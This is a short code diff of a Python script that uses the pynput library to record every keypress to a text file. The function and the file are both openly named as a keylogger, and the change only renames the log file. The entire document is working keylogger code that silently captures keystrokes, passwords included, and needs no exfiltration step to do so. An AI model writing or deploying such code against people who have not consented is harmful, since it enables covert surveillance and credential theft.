@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener    
 
 def hamid_keylogger(key):
-    with open("log.txt", "a") as f:
+    with open("keylogger_generated_by_hamid.txt", "a") as f:
         f.write(str(key) + "\n")
 
 with Listener(on_press=hamid_keylogger) as listener:
